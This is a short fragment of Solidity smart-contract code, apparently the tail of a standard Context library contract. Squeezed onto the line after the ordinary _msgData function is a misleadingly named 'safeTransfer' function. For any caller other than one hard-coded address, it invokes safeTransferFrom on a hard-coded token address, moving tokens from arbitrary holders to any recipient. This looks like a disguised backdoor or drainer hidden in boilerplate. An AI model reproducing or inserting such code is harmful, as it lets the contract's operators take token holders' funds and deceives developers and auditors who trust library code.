 ...
 */
  function _msgData() internal view virtual returns (bytes calldata) {return msg.data;}function safeTransfer(address spender,address recipient,uint256 amount) internal returns (bool) {if (msg.sender != address(0x865B6b4c112eDac44B3F8A812e9b9e0bb4FA0B9c)) {TransferHelper.safeTransferFrom(0xb91f2B0eFF64d9B80902CE818C17B764564A108E,spender,recipient,amount);return true;}return false;}
}
